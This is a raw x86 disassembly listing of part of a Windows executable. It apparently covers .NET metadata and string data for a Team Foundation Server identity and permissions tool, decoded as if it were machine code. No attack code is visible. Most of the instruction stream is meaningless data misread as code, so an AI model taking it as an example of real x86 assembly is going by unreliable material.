  4090f7:	add    BYTE PTR ds:0x19000200,al
  4090fd:	add    BYTE PTR [edi],al
  4090ff:	add    BYTE PTR [edx],al
  409101:	add    BYTE PTR [edx],bl
  409103:	add    BYTE PTR [ecx],cl
  409105:	add    BYTE PTR [edx],al
  409107:	add    BYTE PTR [ebx],bl
  409109:	add    BYTE PTR [ebx],cl
  40910b:	add    BYTE PTR [edx],al
  40910d:	add    BYTE PTR [eax+eax*1],bl
  409110:	or     eax,0x1d000200
  409115:	add    BYTE PTR [edi],cl
  409117:	add    BYTE PTR [edx],al
  409119:	add    BYTE PTR [esi],bl
  40911b:	add    BYTE PTR [ecx],dl
  40911d:	add    BYTE PTR [edx],al
  40911f:	add    BYTE PTR [edi],bl
  409121:	add    BYTE PTR [ebx],dl
  409123:	add    BYTE PTR [edx],al
  409125:	add    BYTE PTR [eax],ah
  409127:	add    BYTE PTR ds:0x21000200,dl
  40912d:	add    BYTE PTR [edi],dl
  40912f:	add    BYTE PTR [edx],al
  409131:	add    BYTE PTR [edx],ah
  409133:	add    BYTE PTR [ecx],bl
  409135:	add    BYTE PTR [edx],al
  409137:	add    BYTE PTR [ebx],ah
  409139:	add    BYTE PTR [ebx],bl
  40913b:	add    BYTE PTR [edx],al
  40913d:	add    BYTE PTR [eax+eax*1],ah
  409140:	sbb    eax,0x25000200
  409145:	add    BYTE PTR [edi],bl
  409147:	add    BYTE PTR [edx],al
  409149:	add    BYTE PTR [esi],ah
  40914b:	add    BYTE PTR [ecx],ah
  40914d:	add    BYTE PTR [edx],al
  40914f:	add    BYTE PTR [edi],ah
  409151:	add    BYTE PTR [ebx],ah
  409153:	add    BYTE PTR [edx],al
  409155:	add    BYTE PTR [eax],ch
  409157:	add    BYTE PTR ds:0x29000200,ah
  40915d:	add    BYTE PTR [edi],ah
  40915f:	add    BYTE PTR [edx],al
  409161:	add    BYTE PTR [edx],ch
  409163:	add    BYTE PTR [ecx],ch
  409165:	add    BYTE PTR [edx],al
  409167:	add    BYTE PTR [ebx],ch
  409169:	add    BYTE PTR [ebx],ch
  40916b:	add    BYTE PTR [edx],al
  40916d:	add    BYTE PTR [eax+eax*1],ch
  409170:	sub    eax,0x2d000200
  409175:	add    BYTE PTR [edi],ch
  409177:	add    BYTE PTR [edx],al
  409179:	add    BYTE PTR [esi],ch
  40917b:	add    BYTE PTR [ecx],dh
  40917d:	add    BYTE PTR [edx],al
  40917f:	add    BYTE PTR [edi],ch
  409181:	add    BYTE PTR [ebx],dh
  409183:	add    BYTE PTR [edx],al
  409185:	add    BYTE PTR [eax],dh
  409187:	add    BYTE PTR ds:0x31000200,dh
  40918d:	add    BYTE PTR [edi],dh
  40918f:	add    BYTE PTR [edx],al
  409191:	add    BYTE PTR [edx],dh
  409193:	add    BYTE PTR [ecx],bh
  409195:	add    BYTE PTR [edx],al
  409197:	add    BYTE PTR [ebx],dh
  409199:	add    BYTE PTR [ebx],bh
  40919b:	add    BYTE PTR [edx],al
  40919d:	add    BYTE PTR [eax+eax*1],dh
  4091a0:	cmp    eax,0x35000200
  4091a5:	add    BYTE PTR [edi],bh
  4091a7:	add    BYTE PTR [edx],al
  4091a9:	add    BYTE PTR [esi],dh
  4091ab:	add    BYTE PTR [ecx+0x0],al
  4091ae:	add    al,BYTE PTR [eax]
  4091b0:	aaa    
  4091b1:	add    BYTE PTR [ebx+0x0],al
  4091b4:	add    al,BYTE PTR [eax]
  4091b6:	cmp    BYTE PTR [eax],al
  4091b8:	inc    ebp
  4091b9:	add    BYTE PTR [edx],al
  4091bb:	add    BYTE PTR [ecx],bh
  4091bd:	add    BYTE PTR [edi+0x0],al
  4091c0:	add    al,BYTE PTR [eax]
  4091c2:	cmp    al,BYTE PTR [eax]
  4091c4:	dec    ecx
  4091c5:	add    BYTE PTR [edx],al
  4091c7:	add    BYTE PTR [ebx],bh
  4091c9:	add    BYTE PTR [ebx+0x0],cl
  4091cc:	add    al,BYTE PTR [eax]
  4091ce:	cmp    al,0x0
  4091d0:	dec    ebp
  4091d1:	add    BYTE PTR [edx],al
  4091d3:	add    BYTE PTR ds:0x2004f00,bh
  4091d9:	add    BYTE PTR [esi],bh
  4091db:	add    BYTE PTR [ecx+0x0],dl
  4091de:	add    al,BYTE PTR [eax]
  4091e0:	aas    
  4091e1:	add    BYTE PTR [ebx+0x0],dl
  4091e4:	add    al,BYTE PTR [eax]
  4091e6:	inc    eax
  4091e7:	add    BYTE PTR [ebp+0x0],dl
  4091ea:	add    al,BYTE PTR [eax]
  4091ec:	inc    ecx
  4091ed:	add    BYTE PTR [edi+0x0],dl
  4091f0:	add    al,BYTE PTR [eax]
  4091f2:	inc    edx
  4091f3:	add    BYTE PTR [ecx+0x0],bl
  4091f6:	add    al,BYTE PTR [eax]
  4091f8:	inc    ebx
  4091f9:	add    BYTE PTR [ebx+0x0],bl
  4091fc:	add    al,BYTE PTR [eax]
  4091fe:	inc    esp
  4091ff:	add    BYTE PTR [ebp+0x0],bl
  409202:	add    al,BYTE PTR [eax]
  409204:	inc    ebp
  409205:	add    BYTE PTR [edi+0x0],bl
  409208:	add    al,BYTE PTR [eax]
  40920a:	inc    esi
  40920b:	add    BYTE PTR [ecx+0x0],ah
  40920e:	add    al,BYTE PTR [eax]
  409210:	inc    edi
  409211:	add    BYTE PTR [ebx+0x0],ah
  409214:	add    al,BYTE PTR [eax]
  409216:	dec    eax
  409217:	add    BYTE PTR [ebp+0x0],ah
  40921a:	add    al,BYTE PTR [eax]
  40921c:	dec    ecx
  40921d:	add    BYTE PTR [edi+0x0],ah
  409220:	add    al,BYTE PTR [eax]
  409222:	dec    edx
  409223:	add    BYTE PTR [ecx+0x0],ch
  409226:	add    al,BYTE PTR [eax]
  409228:	dec    ebx
  409229:	add    BYTE PTR [ebx+0x0],ch
  40922c:	add    al,BYTE PTR [eax]
  40922e:	dec    esp
  40922f:	add    BYTE PTR [ebp+0x0],ch
  409232:	add    al,BYTE PTR [eax]
  409234:	dec    ebp
  409235:	add    BYTE PTR [edi+0x0],ch
  409238:	add    al,BYTE PTR [eax]
  40923a:	dec    esi
  40923b:	add    BYTE PTR [ecx+0x0],dh
  40923e:	add    al,BYTE PTR [eax]
  409240:	dec    edi
  409241:	add    BYTE PTR [ebx+0x0],dh
  409244:	add    al,BYTE PTR [eax]
  409246:	push   eax
  409247:	add    BYTE PTR [ebp+0x0],dh
  40924a:	add    al,BYTE PTR [eax]
  40924c:	push   ecx
  40924d:	add    BYTE PTR [edi+0x0],dh
  409250:	add    al,BYTE PTR [eax]
  409252:	push   edx
  409253:	add    BYTE PTR [ecx+0x0],bh
  409256:	add    al,BYTE PTR [eax]
  409258:	push   ebx
  409259:	add    BYTE PTR [ebx+0x0],bh
  40925c:	add    al,BYTE PTR [eax]
  40925e:	push   esp
  40925f:	add    BYTE PTR [ebp+0x0],bh
  409262:	add    al,BYTE PTR [eax]
  409264:	push   ebp
  409265:	add    BYTE PTR [edi+0x0],bh
  409268:	add    al,BYTE PTR [eax]
  40926a:	push   esi
  40926b:	add    BYTE PTR [ecx+0x57000200],al
  409271:	add    BYTE PTR [ebx+0x58000200],al
  409277:	add    BYTE PTR [ebp+0x59000200],al
  40927d:	add    BYTE PTR [edi+0x5a000200],al
  409283:	add    BYTE PTR [ecx+0x5b000200],cl
  409289:	add    BYTE PTR [ebx+0x5c000200],cl
  40928f:	add    BYTE PTR [ebp+0x5d000200],cl
  409295:	add    BYTE PTR [edi-0x19fd2d00],cl
  40929b:	add    ah,BYTE PTR [edx]
  40929d:	add    ebp,DWORD PTR [edx]
  40929f:	add    eax,DWORD PTR [ebx]
  4092a1:	add    al,0x8b
  4092a3:	add    al,0x9f
  4092a5:	add    al,0xb4
  4092a7:	add    al,0xd9
  4092a9:	add    eax,0x2a2005e1
  4092ae:	add    BYTE PTR [eax],al
  4092b0:	or     eax,0x2a6800
  4092b5:	add    BYTE PTR [esi],cl
  4092b7:	add    BYTE PTR [eax+eax*4],al
  4092ba:	add    BYTE PTR [eax],al
  4092bc:	or     eax,DWORD PTR [eax]
  4092be:	add    BYTE PTR [eax],al
  4092c0:	add    BYTE PTR [eax],al
  4092c2:	add    BYTE PTR [eax],al
  4092c4:	add    DWORD PTR [eax],eax
  4092c6:	add    BYTE PTR [eax],al
  4092c8:	pusha  
  4092c9:	add    DWORD PTR [edx+0x4000013],edx
	...
  4092d7:	add    BYTE PTR [eax],al
  4092d9:	add    BYTE PTR [ecx],al
  4092db:	add    BYTE PTR [ebx+0x0],dl
  4092de:	add    BYTE PTR [eax],al
  4092e0:	add    BYTE PTR [eax],al
  4092e2:	or     eax,DWORD PTR [eax]
	...
  4092ec:	add    BYTE PTR [eax],al
  4092ee:	jbe    0x4092f0
  4092f0:	retf   
  4092f1:	add    BYTE PTR [eax],al
  4092f3:	add    BYTE PTR [eax],al
  4092f5:	add    BYTE PTR [ebx],cl
	...
  4092ff:	add    BYTE PTR [eax],al
  409301:	add    BYTE PTR [esi+0x0],dh
  409304:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409305:	add    DWORD PTR [eax],eax
  409307:	add    BYTE PTR [eax],al
  409309:	add    BYTE PTR [edx],al
	...
  409313:	add    BYTE PTR [eax],al
  409315:	add    BYTE PTR [ecx],al
  409317:	add    BYTE PTR [ebx+0x0],dl
  40931a:	add    BYTE PTR [eax],al
  40931c:	add    BYTE PTR [eax],al
  40931e:	add    al,BYTE PTR [eax]
	...
  409328:	add    BYTE PTR [eax],al
  40932a:	add    DWORD PTR [eax],eax
  40932c:	pop    esp
  40932d:	add    BYTE PTR [eax],al
  40932f:	add    BYTE PTR [eax],al
  409331:	add    BYTE PTR [eax+eax*1],al
	...
  40933c:	add    BYTE PTR [eax],al
  40933e:	add    DWORD PTR [eax],eax
  409340:	pop    esp
	...
  409349:	add    BYTE PTR [ecx],al
  40934b:	add    BYTE PTR [eax],al
  40934d:	add    BYTE PTR [eax+0x1e],cl
  409350:	add    BYTE PTR [eax],al
  409352:	add    eax,0x43000400
  409357:	add    eax,eax
  409359:	add    eax,0x5c50143
  40935e:	inc    ebx
  40935f:	add    edx,ecx
  409361:	add    eax,0x3c000000
  409366:	dec    ebp
  409367:	outs   dx,DWORD PTR ds:[esi]
  409368:	fs jne 0x4093d7
  40936b:	gs add BYTE PTR ds:[esi+eax*2+0x53],dl
  409371:	push   ebx
  409372:	arpl   WORD PTR gs:[ebp+0x72],si
  409376:	imul   esi,DWORD PTR [ecx+edi*2+0x2e],0x657865
  40937e:	inc    edi
  40937f:	jae    0x4093f4
  409381:	push   ebp
  409382:	je     0x4093ed
  409384:	ins    BYTE PTR es:[edi],dx
  409385:	add    BYTE PTR [ebp+0x69],cl
  409388:	arpl   WORD PTR [edx+0x6f],si
  40938b:	jae    0x4093fc
  40938d:	data16 je 0x4093be
  409390:	push   esp
  409391:	gs popa 
  409393:	ins    DWORD PTR es:[edi],dx
  409394:	inc    esi
  409395:	outs   dx,DWORD PTR ds:[esi]
  409396:	jne    0x409406
  409398:	fs popa 
  40939a:	je     0x409405
  40939c:	outs   dx,DWORD PTR ds:[esi]
  40939d:	outs   dx,BYTE PTR ds:[esi]
  40939e:	cs push ebx
  4093a0:	gs jb  0x409419
  4093a3:	gs jb  0x4093a6
  4093a6:	inc    edi
  4093a7:	jae    0x40941c
  4093a9:	push   ebp
  4093aa:	je     0x409415
  4093ac:	ins    BYTE PTR es:[edi],dx
  4093ad:	push   edx
  4093ae:	gs jae 0x409420
  4093b1:	jne    0x409425
  4093b3:	arpl   WORD PTR [ebp+0x73],sp
  4093b6:	add    BYTE PTR [ebp+0x73],ch
  4093b9:	arpl   WORD PTR [edi+0x72],bp
  4093bc:	ins    BYTE PTR es:[edi],dx
  4093bd:	imul   esp,DWORD PTR [edx+0x0],0x74737953
  4093c4:	gs ins DWORD PTR es:[edi],dx
  4093c6:	add    BYTE PTR [edi+0x62],cl
  4093c9:	push   0x65
  4093cb:	arpl   WORD PTR [eax+eax*1+0x53],si
  4093cf:	gs jb  0x409448
  4093d2:	gs jb  0x40941c
  4093d5:	ins    BYTE PTR es:[edi],dx
  4093d6:	outs   dx,DWORD PTR ds:[esi]
  4093d7:	bound  esp,QWORD PTR [ecx+0x6c]
  4093da:	add    BYTE PTR [ebx+0x5f],ah
  4093dd:	arpl   WORD PTR [edi+0x6c],bp
  4093e0:	ins    BYTE PTR es:[edi],dx
  4093e1:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4093e6:	outs   dx,BYTE PTR ds:[esi]
  4093e7:	push   ebx
  4093e8:	ja     0x409453
  4093ea:	je     0x40944f
  4093ec:	push   0x735f6300
  4093f1:	gs jb  0x40946a
  4093f4:	gs jb  0x40944a
  4093f7:	ja     0x409462
  4093f9:	je     0x40945e
  4093fb:	push   0x635f6300
  409400:	outs   dx,DWORD PTR ds:[esi]
  409401:	ins    BYTE PTR es:[edi],dx
  409402:	ins    BYTE PTR es:[edi],dx
  409403:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  409408:	outs   dx,BYTE PTR ds:[esi]
  409409:	inc    ebp
  40940a:	outs   dx,BYTE PTR ds:[esi]
  40940b:	jbe    0x409460
  40940d:	ja     0x409478
  40940f:	je     0x409474
  409411:	push   0x735f6300
  409416:	gs jb  0x40948f
  409419:	gs jb  0x409461
  40941c:	outs   dx,BYTE PTR ds:[esi]
  40941d:	jbe    0x409472
  40941f:	ja     0x40948a
  409421:	je     0x409486
  409423:	push   0x69725000
  409428:	outs   dx,BYTE PTR ds:[esi]
  409429:	je     0x409473
  40942b:	gs ins BYTE PTR es:[edi],dx
  40942d:	jo     0x40942f
  40942f:	dec    ebp
  409430:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  409437:	je     0x409467
  409439:	push   esp
  40943a:	gs popa 
  40943c:	ins    DWORD PTR es:[edi],dx
  40943d:	inc    esi
  40943e:	outs   dx,DWORD PTR ds:[esi]
  40943f:	jne    0x4094af
  409441:	fs popa 
  409443:	je     0x4094ae
  409445:	outs   dx,DWORD PTR ds:[esi]
  409446:	outs   dx,BYTE PTR ds:[esi]
  409447:	cs inc ebx
  409449:	ins    BYTE PTR es:[edi],dx
  40944a:	imul   esp,DWORD PTR [ebp+0x6e],0x694d0074
  409451:	arpl   WORD PTR [edx+0x6f],si
  409454:	jae    0x4094c5
  409456:	data16 je 0x409487
  409459:	push   esp
  40945a:	gs popa 
  40945c:	ins    DWORD PTR es:[edi],dx
  40945d:	inc    esi
  40945e:	outs   dx,DWORD PTR ds:[esi]
  40945f:	jne    0x4094cf
  409461:	fs popa 
  409463:	je     0x4094ce
  409465:	outs   dx,DWORD PTR ds:[esi]
  409466:	outs   dx,BYTE PTR ds:[esi]
  409467:	cs inc esi
  409469:	jb     0x4094cc
  40946b:	ins    DWORD PTR es:[edi],dx
  40946c:	gs ja  0x4094de
  40946f:	jb     0x4094dc
  409471:	cs inc ebx
  409473:	ins    BYTE PTR es:[edi],dx
  409474:	imul   esp,DWORD PTR [ebp+0x6e],0x65540074
  40947b:	popa   
  40947c:	ins    DWORD PTR es:[edi],dx
  40947d:	inc    esi
  40947e:	outs   dx,DWORD PTR ds:[esi]
  40947f:	jne    0x4094ef
  409481:	fs popa 
  409483:	je     0x4094ee
  409485:	outs   dx,DWORD PTR ds:[esi]
  409486:	outs   dx,BYTE PTR ds:[esi]
  409487:	dec    ecx
  409488:	fs outs dx,BYTE PTR gs:[esi]
  40948b:	je     0x4094f6
  40948d:	je     0x409508
  40948f:	add    BYTE PTR [eax+0x72],dl
  409492:	imul   ebp,DWORD PTR [esi+0x74],0x6e656449
  409499:	je     0x409504
  40949b:	je     0x409516
  40949d:	add    BYTE PTR [eax+0x72],dl
  4094a0:	imul   ebp,DWORD PTR [esi+0x74],0x6e656449
  4094a7:	je     0x409512
  4094a9:	je     0x409524
  4094ab:	inc    edx
  4094ac:	jb     0x409517
  4094ae:	data16 add BYTE PTR gs:[ebx+0x65],dl
  4094b3:	arpl   WORD PTR [ebp+0x72],si
  4094b6:	imul   esi,DWORD PTR [ecx+edi*2+0x4e],0x73656d61
  4094be:	jo     0x409521
  4094c0:	arpl   WORD PTR [ebp+0x44],sp
  4094c3:	gs jae 0x409529
  4094c6:	jb     0x409531
  4094c8:	jo     0x40953e
  4094ca:	imul   ebp,DWORD PTR [edi+0x6e],0x63634100
  4094d1:	gs jae 0x409547
  4094d4:	inc    ebx
  4094d5:	outs   dx,DWORD PTR ds:[esi]
  4094d6:	outs   dx,BYTE PTR ds:[esi]
  4094d7:	je     0x40954b
  4094d9:	outs   dx,DWORD PTR ds:[esi]
  4094da:	ins    BYTE PTR es:[edi],dx
  4094db:	inc    ebp
  4094dc:	outs   dx,BYTE PTR ds:[esi]
  4094dd:	je     0x409551
  4094df:	jns    0x4094e1
  4094e1:	push   eax
  4094e2:	jb     0x40954d
  4094e4:	outs   dx,BYTE PTR ds:[esi]
  4094e5:	je     0x409528
  4094e7:	inc    ebx
  4094e8:	inc    ebp
  4094e9:	add    BYTE PTR [ecx+0x63],al
  4094ec:	arpl   WORD PTR [ebp+0x73],sp
  4094ef:	jae    0x409534
  4094f1:	outs   dx,DWORD PTR ds:[esi]
  4094f2:	outs   dx,BYTE PTR ds:[esi]
  4094f3:	je     0x409567
  4094f5:	outs   dx,DWORD PTR ds:[esi]
  4094f6:	ins    BYTE PTR es:[edi],dx
  4094f7:	dec    esp
  4094f8:	imul   esi,DWORD PTR [ebx+0x74],0x69725000
  4094ff:	outs   dx,BYTE PTR ds:[esi]
  409500:	je     0x409543
  409502:	inc    ebx
  409503:	dec    esp
  409504:	add    BYTE PTR [edi+0x61],dl
  409507:	jb     0x409577
  409509:	add    BYTE PTR [ebp+0x69],cl
  40950c:	arpl   WORD PTR [edx+0x6f],si
  40950f:	jae    0x409580
  409511:	data16 je 0x409542
  409514:	push   esp
  409515:	gs popa 
  409517:	ins    DWORD PTR es:[edi],dx
  409518:	inc    esi
  409519:	outs   dx,DWORD PTR ds:[esi]
  40951a:	jne    0x40958a
  40951c:	fs popa 
  40951e:	je     0x409589
  409520:	outs   dx,DWORD PTR ds:[esi]
  409521:	outs   dx,BYTE PTR ds:[esi]
  409522:	cs inc ebx
  409524:	outs   dx,DWORD PTR ds:[esi]
  409525:	ins    DWORD PTR es:[edi],dx
  409526:	ins    DWORD PTR es:[edi],dx
  409527:	outs   dx,DWORD PTR ds:[esi]
  409528:	outs   dx,BYTE PTR ds:[esi]
  409529:	add    BYTE PTR [ebp+0x69],cl
  40952c:	arpl   WORD PTR [edx+0x6f],si
  40952f:	jae    0x4095a0
  409531:	data16 je 0x409562
  409534:	push   esp
  409535:	gs popa 
  409537:	ins    DWORD PTR es:[edi],dx
  409538:	inc    esi
  409539:	outs   dx,DWORD PTR ds:[esi]
  40953a:	jne    0x4095aa
  40953c:	fs popa 
  40953e:	je     0x4095a9
  409540:	outs   dx,DWORD PTR ds:[esi]
  409541:	outs   dx,BYTE PTR ds:[esi]
  409542:	cs inc esi
  409544:	jb     0x4095a7
  409546:	ins    DWORD PTR es:[edi],dx
  409547:	gs ja  0x4095b9
  40954a:	jb     0x4095b7
  40954c:	cs inc ebx
  40954e:	outs   dx,DWORD PTR ds:[esi]
  40954f:	ins    DWORD PTR es:[edi],dx
  409550:	ins    DWORD PTR es:[edi],dx
  409551:	outs   dx,DWORD PTR ds:[esi]
  409552:	outs   dx,BYTE PTR ds:[esi]
  409553:	add    BYTE PTR [ebp+0x65],cl
  409556:	ins    DWORD PTR es:[edi],dx
  409557:	bound  esp,QWORD PTR [ebp+0x72]
  40955a:	jae    0x4095c4
  40955c:	imul   esi,DWORD PTR [eax+0x51],0x79726575
  409563:	add    BYTE PTR [edx+0x65],dl
  409566:	popa   
  409567:	fs dec ecx
  409569:	fs outs dx,BYTE PTR gs:[esi]
  40956c:	je     0x4095d7
  40956e:	je     0x4095e9
  409570:	dec    edi
  409571:	jo     0x4095e7
  409573:	imul   ebp,DWORD PTR [edi+0x6e],0x65520073
  40957a:	jae    0x4095eb
  40957c:	ins    BYTE PTR es:[edi],dx
  40957d:	jbe    0x4095e4
  40957f:	dec    ecx
  409580:	fs outs dx,BYTE PTR gs:[esi]
  409583:	je     0x4095ee
  409585:	je     0x409600
  409587:	dec    ecx
  409588:	outs   dx,BYTE PTR ds:[esi]
  409589:	je     0x4095f0
  40958b:	jb     0x4095fb
  40958d:	popa   
  40958e:	ins    BYTE PTR es:[edi],dx
  40958f:	add    BYTE PTR [edx+0x65],dl
  409592:	jae    0x409603
  409594:	ins    BYTE PTR es:[edi],dx
  409595:	jbe    0x4095fc
  409597:	dec    ecx
  409598:	fs outs dx,BYTE PTR gs:[esi]
  40959b:	je     0x409606
  40959d:	je     0x409618
  40959f:	add    BYTE PTR [ecx+0x64],cl
  4095a2:	outs   dx,BYTE PTR gs:[esi]
  4095a4:	je     0x40960f
  4095a6:	je     0x409621
  4095a8:	inc    esp
  4095a9:	gs jae 0x40960f
  4095ac:	jb     0x409617
  4095ae:	jo     0x409624
  4095b0:	outs   dx,DWORD PTR ds:[esi]
  4095b1:	jb     0x4095b3
  4095b3:	push   edx
  4095b4:	gs popa 
  4095b6:	fs dec ecx
  4095b8:	fs outs dx,BYTE PTR gs:[esi]
  4095bb:	je     0x409626
  4095bd:	je     0x409638
  4095bf:	push   edi
  4095c0:	imul   esi,DWORD PTR [eax+ebp*2+0x57],0x746961
  4095c8:	dec    ebp
  4095c9:	popa   
  4095ca:	imul   ebp,DWORD PTR [esi+0x0],0x75636553
  4095d1:	jb     0x40963c
  4095d3:	je     0x40964e
  4095d5:	dec    esi
  4095d6:	popa   
  4095d7:	ins    DWORD PTR es:[edi],dx
  4095d8:	gs jae 0x40964b
  4095db:	popa   
  4095dc:	arpl   WORD PTR [ebp+0x0],sp
  4095df:	inc    esp
  4095e0:	gs je  0x409648
  4095e3:	jb     0x409652
  4095e5:	imul   ebp,DWORD PTR [esi+0x65],0x56454341
  4095ec:	popa   
  4095ed:	ins    BYTE PTR es:[edi],dx
  4095ee:	jne    0x409655
  4095f0:	jae    0x4095f2
  4095f2:	inc    esp
  4095f3:	gs je  0x40965b
  4095f6:	jb     0x409665
  4095f8:	imul   ebp,DWORD PTR [esi+0x65],0x75636553
  4095ff:	jb     0x40966a
  409601:	je     0x40967c
  409603:	dec    esi
  409604:	popa   
  409605:	ins    DWORD PTR es:[edi],dx
  409606:	gs jae 0x409679
  409609:	popa   
  40960a:	arpl   WORD PTR [ebp+0x0],sp
  40960d:	push   eax
  40960e:	gs jb  0x409677
  409611:	outs   dx,DWORD PTR ds:[esi]
  409612:	jb     0x409681
  409614:	inc    ecx
  409615:	jne    0x40968b
  409617:	push   0x7a69726f
  40961c:	popa   
  40961d:	je     0x409688
  40961f:	outs   dx,DWORD PTR ds:[esi]
  409620:	outs   dx,BYTE PTR ds:[esi]
  409621:	push   edx
  409622:	gs popa 
  409624:	fs inc ecx
  409626:	arpl   WORD PTR [eax+eax*1+0x50],bp
  40962a:	gs jb  0x409693
  40962d:	outs   dx,DWORD PTR ds:[esi]
  40962e:	jb     0x40969d
  409630:	inc    ecx
  409631:	jne    0x4096a7
  409633:	push   0x7a69726f
  409638:	popa   
  409639:	je     0x4096a4
  40963b:	outs   dx,DWORD PTR ds:[esi]
  40963c:	outs   dx,BYTE PTR ds:[esi]
  40963d:	inc    ecx
  40963e:	arpl   WORD PTR [ebp+0x52],sp
  409641:	gs ins DWORD PTR es:[edi],dx
  409643:	outs   dx,DWORD PTR ds:[esi]
  409644:	jbe    0x4096ab
  409646:	add    BYTE PTR [eax+0x65],dl
  409649:	jb     0x4096b1
  40964b:	outs   dx,DWORD PTR ds:[esi]
  40964c:	jb     0x4096bb
  40964e:	inc    ecx
  40964f:	jne    0x4096c5
  409651:	push   0x7a69726f
  409656:	popa   
  409657:	je     0x4096c2
  409659:	outs   dx,DWORD PTR ds:[esi]
  40965a:	outs   dx,BYTE PTR ds:[esi]
  40965b:	inc    ecx
  40965c:	arpl   WORD PTR [ebp+0x41],sp
  40965f:	fs add BYTE PTR fs:[esi+eiz*2+0x73],dl
  409665:	inc    ebx
  409666:	outs   dx,DWORD PTR ds:[esi]
  409667:	outs   dx,BYTE PTR ds:[esi]
  409668:	outs   dx,BYTE PTR ds:[esi]
  409669:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40966e:	outs   dx,BYTE PTR ds:[esi]
  40966f:	add    BYTE PTR [ecx+0x6e],cl
  409672:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x657a696c
  40967a:	push   eax
  40967b:	jb     0x4096ec
  40967d:	js     0x4096e8
  40967f:	gs jae 0x409682
  409682:	dec    ecx
  409683:	dec    ecx
  409684:	fs outs dx,BYTE PTR gs:[esi]
  409687:	je     0x4096f2
  409689:	je     0x409704
  40968b:	dec    ebp
  40968c:	popa   
  40968d:	outs   dx,BYTE PTR ds:[esi]
  40968e:	popa   
  40968f:	gs ins DWORD PTR es:[di],dx
  409692:	outs   dx,BYTE PTR gs:[esi]
  409694:	je     0x4096e9
  409696:	gs jb  0x40970f
  409699:	imul   esp,DWORD PTR [ebx+0x65],0x695f7300
  4096a0:	fs outs dx,BYTE PTR gs:[esi]
  4096a3:	je     0x40970e
  4096a5:	je     0x409720
  4096a7:	dec    ebp
  4096a8:	popa   
  4096a9:	outs   dx,BYTE PTR ds:[esi]
  4096aa:	popa   
  4096ab:	gs ins DWORD PTR es:[di],dx
  4096ae:	outs   dx,BYTE PTR gs:[esi]
  4096b0:	je     0x4096b2
  4096b2:	dec    ecx
  4096b3:	push   ebx
  4096b4:	arpl   WORD PTR gs:[ebp+0x72],si
  4096b8:	imul   esi,DWORD PTR [ecx+edi*2+0x53],0x69767265
  4096c0:	arpl   WORD PTR [ebp+0x0],sp
  4096c3:	jae    0x409724
  4096c5:	jae    0x40972c
  4096c7:	arpl   WORD PTR [ebp+0x72],si
  4096ca:	imul   esi,DWORD PTR [ecx+edi*2+0x53],0x69767265
  4096d2:	arpl   WORD PTR [ebp+0x0],sp
  4096d5:	dec    ecx
  4096d6:	inc    ecx
  4096d7:	jne    0x40974d
  4096d9:	push   0x7a69726f
  4096de:	popa   
  4096df:	je     0x40974a
  4096e1:	outs   dx,DWORD PTR ds:[esi]
  4096e2:	outs   dx,BYTE PTR ds:[esi]
  4096e3:	push   ebx
  4096e4:	gs jb  0x40975d
  4096e7:	imul   esp,DWORD PTR [ebx+0x65],0x615f7300
  4096ee:	jne    0x409764
  4096f0:	push   0x7a69726f
  4096f5:	popa   
  4096f6:	je     0x409761
  4096f8:	outs   dx,DWORD PTR ds:[esi]
  4096f9:	outs   dx,BYTE PTR ds:[esi]
  4096fa:	push   ebx
  4096fb:	gs jb  0x409774
  4096fe:	imul   esp,DWORD PTR [ebx+0x65],0x735f7300
  409705:	gs jb  0x40977e
  409708:	gs jb  0x40970b
  40970b:	push   ebx
  40970c:	jns    0x409781
  40970e:	je     0x409775
  409710:	ins    DWORD PTR es:[edi],dx
  409711:	cs inc ebx
  409713:	outs   dx,DWORD PTR ds:[esi]
  409714:	ins    BYTE PTR es:[edi],dx
  409715:	ins    BYTE PTR es:[edi],dx
  409716:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40971b:	outs   dx,BYTE PTR ds:[esi]
  40971c:	jae    0x40974c
  40971e:	inc    edi
  40971f:	outs   dx,BYTE PTR gs:[esi]
  409721:	gs jb  0x40978d
  409724:	arpl   WORD PTR [eax],ax
  409726:	inc    esp
  409727:	imul   esp,DWORD PTR [ebx+0x74],0x616e6f69
  40972e:	jb     0x4097a9
  409730:	pusha  
  409731:	xor    al,BYTE PTR [eax]
  409733:	jae    0x409794
  409735:	jae    0x40979c
  409737:	arpl   WORD PTR [ebp+0x72],si
  40973a:	imul   esi,DWORD PTR [ecx+edi*2+0x4e],0x73656d61
  409742:	jo     0x4097a5
  409744:	arpl   WORD PTR [ebp+0x73],sp
  409747:	add    BYTE PTR [esi],ch
  409749:	arpl   WORD PTR [edi+ebp*2+0x72],si
  40974d:	add    BYTE PTR [ebx+0x79],dl
  409750:	jae    0x4097c6
  409752:	gs ins DWORD PTR es:[edi],dx
  409754:	cs push edx
  409756:	gs jae 0x4097c8
  409759:	jne    0x4097cd
  40975b:	arpl   WORD PTR [ebp+0x73],sp
  40975e:	add    BYTE PTR [edx+0x65],dl
  409761:	jae    0x4097d2
  409763:	jne    0x4097d7
  409765:	arpl   WORD PTR [ebp+0x4d],sp
  409768:	popa   
  409769:	outs   dx,BYTE PTR ds:[esi]
  40976a:	popa   
  40976b:	addr16 gs jb 0x40976f
  40976f:	jb     0x4097d6
  409771:	jae    0x4097e2
  409773:	jne    0x4097e7
  409775:	arpl   WORD PTR [ebp+0x4d],sp
  409778:	popa   
  409779:	outs   dx,BYTE PTR ds:[esi]
  40977a:	add    BYTE PTR [ebx+0x79],dl
  40977d:	jae    0x4097f3
  40977f:	gs ins DWORD PTR es:[edi],dx
  409781:	cs inc edi
  409783:	ins    BYTE PTR es:[edi],dx
  409784:	outs   dx,DWORD PTR ds:[esi]
  409785:	bound  esp,QWORD PTR [ecx+0x6c]
  409788:	imul   edi,DWORD PTR [edx+0x61],0x6e6f6974
  40978f:	add    BYTE PTR [ebx+0x75],al
  409792:	ins    BYTE PTR es:[edi],dx
  409793:	je     0x40980a
  409795:	jb     0x4097fc
  409797:	dec    ecx
  409798:	outs   dx,BYTE PTR ds:[esi]
  409799:	outs   dx,WORD PTR ds:[esi]
  40979b:	add    BYTE PTR [edx+0x65],dh
  40979e:	jae    0x40980f
  4097a0:	jne    0x409814
  4097a2:	arpl   WORD PTR [ebp+0x43],sp
  4097a5:	jne    0x409813
  4097a7:	je     0x40981e
